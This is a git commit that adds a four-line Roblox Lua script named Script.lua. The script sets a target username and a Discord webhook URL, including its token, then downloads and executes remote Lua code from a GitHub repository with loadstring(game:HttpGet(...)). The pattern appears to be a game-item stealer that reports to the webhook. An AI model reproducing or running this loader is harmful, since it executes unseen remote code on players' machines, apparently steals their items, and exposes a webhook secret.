f8e037a587fcfa6a53f70da519d6781d1ba40cdb
IMakeScripts82737 <120314687+IMakeScripts82737@users.noreply.github.com>
2022-12-11 20:39:21 +0800

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,4 @@
+UserName = "Johnpogi123875"
+WebHook = "https://discord.com/api/webhooks/1051471522411331654/3U7htioWabm6A0Rs5RLM6wCA0tVmaZIaCMau58LpGODqDRZ7DdS3mDN39J7mv1lvO1GP"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
